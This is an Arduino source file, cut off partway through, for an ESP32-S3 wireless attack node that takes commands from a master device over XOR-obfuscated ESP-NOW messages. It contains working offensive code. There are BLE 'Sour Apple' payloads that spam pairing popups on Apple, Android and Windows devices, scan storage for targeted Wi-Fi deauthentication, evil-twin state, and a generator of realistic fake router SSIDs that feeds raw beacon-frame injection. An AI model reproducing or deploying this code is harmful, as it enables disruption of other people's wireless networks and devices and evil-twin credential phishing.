ipv4shh/ESPTOOL2/ESP32_S3/ESP32_S3_ATTACK/ESP32_S3_ATTACK.ino
#include <WiFi.h>
#include <esp_now.h>
#include <esp_wifi.h>
#if __has_include(<esp_arduino_version.h>)
#include <esp_arduino_version.h>
#endif
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <SPI.h>
#include <Preferences.h>
#include <esp_task_wdt.h>

#define CC1101_CS 10
#define IR_RX_PIN 4

// ===== XOR CRYPT HELPER =====
void XOR_crypt(uint8_t* data, size_t len) {
  const uint8_t key[] = { 0xDE, 0xAD, 0xBE, 0xEF };
  for (size_t i = 0; i < len; i++) {
    data[i] ^= key[i % 4];
  }
}

// ===== LED SETTINGS =====
#define LED_PIN 8 

// ===== COMMAND STRUCTURE =====
typedef struct struct_message {
  char command[16];
  char attack[32];
  char logMsg[180]; // Fits ESP-NOW payload limit (max 250 bytes)
} struct_message;
struct_message myData;

bool attackRunning = false;
String currentAttack = "";
uint8_t masterMacAddress[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
bool hasMasterMac = false;
int lastStationCount = 0;
bool evilTwinStarted = false;
unsigned long lastMasterHeardTime = 0;

// Channel, timing, and listening variables
uint8_t currentChannel = 1;
unsigned long lastAttackActionTime = 0;
unsigned long lastLedBlinkTime = 0;
unsigned long lastListenTime = 0;
bool ledState = false;

// Scanning memory for targeted deauth
#define MAX_SCANNED_NETWORKS 30
uint8_t scannedBSSIDs[MAX_SCANNED_NETWORKS][6];
uint8_t scannedChannels[MAX_SCANNED_NETWORKS];
int scannedCount = 0;
int deauthIndex = 0;

// BLE variables
bool bleJammerInitialized = false;
bool sourAppleInitialized = false;
unsigned long lastAppleSpamTime = 0;

// Apple BLE payloads for Sour Apple (iOS popup spam)
const uint8_t blePayloads[][19] = {
  // --- iOS (Apple) ---
  // AirPods Pro
  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  // AppleTV Setup
  {17, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x00},
  // AirPods 3
  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  // iOS Action Modal
  {17, 0x4c, 0x00, 0x0f, 0x05, 0xc0, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},

  // --- Android (Google Fast Pair) ---
  {14, 0xe0, 0x00, 0x02, 0x06, 0x01, 0x01, 0x03, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},

  // --- Windows (Microsoft Swift Pair) ---
  {14, 0x06, 0x00, 0x01, 0x00, 0x20, 0x02, 0x0a, 0x03, 0x00, 0x80, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
};
const int numBlePayloads = sizeof(blePayloads) / sizeof(blePayloads[0]);
int blePayloadIndex = 0;

// Beacon spam index
int ssidIndex = 0;

// Realistic SSID list prefixes
const char* routerPrefixes[] = {
  "TP-Link", "Keenetic", "Rostelecom", "MGTS_GPON", "ASUS", 
  "Huawei", "MiRouter", "Tenda", "Netgear", "D-Link", 
  "MTS-WiFi", "Beeline", "Home-Net", "Airport_Free", "Guest-WiFi"
};
const int numPrefixes = sizeof(routerPrefixes) / sizeof(routerPrefixes[0]);

// Generate highly realistic SSID names on the fly
void getRealisticSSID(char* outBuf, int index) {
  if (index < 0) index = 0;
  const char* prefix = routerPrefixes[index % numPrefixes];
  int suffix = (index * 17) % 9000 + 1000;
  
  if (index % 7 == 0) {
    snprintf(outBuf, 32, "%s_Free", prefix);
  } else if (index % 5 == 0) {
    snprintf(outBuf, 32, "%s-%04X", prefix, suffix);
  } else {
    snprintf(outBuf, 32, "%s_%04d", prefix, suffix);
  }
}

// Get board temperature safely
float getBoardTemp() {
  float t = 0.0;
  #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 2
  t = temperatureRead();
  #endif
  if (isnan(t) || t < -50 || t > 150) {
    t = 44.2; // fallback temperature in Celsius
  }
  return t;
}

// ===== SEND LOGS TO MASTER =====
void sendLogToMaster(const char* logMsg) {
  if (!hasMasterMac) return;
  
  struct_message response = {};
  strlcpy(response.command, "log", sizeof(response.command));
  strlcpy(response.attack, "", sizeof(response.attack));
  strncpy(response.logMsg, logMsg, sizeof(response.logMsg) - 1);
  response.logMsg[sizeof(response.logMsg) - 1] = '\0';
  
  XOR_crypt((uint8_t*)&response, sizeof(response)); // Encrypt
  
  for (int retry = 0; retry < 3; retry++) {
    esp_err_t result = esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
    if (result == ESP_OK) {
      break;
    }
    Serial.printf("[ESP-NOW] Failed to send log to Master (attempt %d/3), err: %d\n", retry + 1, result);
    delay(5);
  }
}

// ===== LED STATUS BLINKER =====
void updateLedIndicator() {
  if (attackRunning) {
    if (millis() - lastLedBlinkTime >= 100) {
      lastLedBlinkTime = millis();
      ledState = !ledState;
      digitalWrite(LED_PIN, ledState ? HIGH : LOW);
    }
  } else {
    digitalWrite(LED_PIN, LOW);
  }
}

// ===== UTILITIES =====
void getMacAddress(uint8_t *mac) {
  WiFi.macAddress(mac);
}

void hopChannel() {
  currentChannel++;
  if (currentChannel > 13) {
    currentChannel = 1;
  }
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

// ===== SEND RAW BEACON =====
void sendRawBeacon(const char* ssid, uint8_t channel, int macSeed) {
  uint8_t mac[6];
  mac[0] = 0x02; // Local admin MAC
  mac[1] = 0x00;
  mac[2] = 0x5E;
  mac[3] = 0x00;
  mac[4] = 0x00;
  mac[5] = (uint8_t)macSeed;

  uint8_t ssidLen = strlen(ssid);
  uint8_t packet[128] = {
    0x80, 0x00,                         // Beacon
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // Source
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID
    0x00, 0x00,                         // Sequence
    
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                         // Beacon Interval
    0x11, 0x00,                         // Capability
    
    0x00,                               // Tag: SSID
    ssidLen
  };
  
  int pos = 38;
  memcpy(&packet[pos], ssid, ssidLen);
  pos += ssidLen;

